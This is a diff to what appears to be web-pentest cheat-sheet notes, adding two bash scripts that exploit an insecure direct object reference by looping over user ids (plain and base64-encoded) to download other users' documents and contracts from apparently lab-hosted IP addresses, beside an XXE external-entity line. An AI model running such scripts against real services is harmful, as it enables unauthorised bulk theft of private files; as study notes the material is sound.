@@ -18,6 +18,28 @@ md5sum
 base64
 ```
 
+```
+#!/bin/bash
+ 2
+ 3 url="http://83.136.255.170:55120"
+ 4
+ 5 for i in {1..20}; do
+ 6         for link in $(curl -X POST -d "uid=$i" -H "Content-Type: application/x-www-form-urlencoded" $url/documents.php | grep -oP "/documents/[^\"']+\.txt"); do
+ 7                 wget -q $url/$link
+ 8         done
+ 9 done
+```
+
+```
+#!/bin/bash
+ 2
+ 3 for i in {1..20}; do
+ 4     for hash in $(echo -n $i | base64 -w 0); do
+ 5         curl "http://94.237.123.185:54572/download.php?contract=$hash"
+ 6     done
+ 7 done
+```
+
 ## XXE
 ```
 <!ENTITY xxe SYSTEM "http://localhost/email.dtd">
